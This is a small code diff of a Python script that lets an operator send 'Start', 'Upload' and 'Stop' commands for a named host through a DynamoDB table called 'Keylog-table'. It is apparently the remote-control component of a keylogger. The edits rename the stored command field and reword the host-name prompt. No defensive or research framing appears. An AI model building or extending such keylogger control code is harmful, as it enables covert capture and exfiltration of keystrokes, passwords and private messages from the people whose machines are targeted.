@@ -1,5 +1,4 @@
 import boto3
-import os
 from dotenv import load_dotenv
 
 
@@ -7,7 +6,7 @@ def main():
 
     load_dotenv()
     
-    host_name = input("Device id: ")
+    host_name = input("Host name is case and whitespace sensitive\nHost name: ")
 
     while True:
         cmd = input("Enter cmd: Start | Upload | Stop = ").strip().lower()
@@ -28,7 +27,7 @@ def update_cmd(host_name, cmd):
     dynamodb.update_item(
         TableName='Keylog-table',
         Key={'hostName': {'S': host_name}},
-        UpdateExpression='SET last_command = :cmd',
+        UpdateExpression='SET curr_cmd = :cmd',
         ExpressionAttributeValues={':cmd': {'S': cmd}}
 )
     
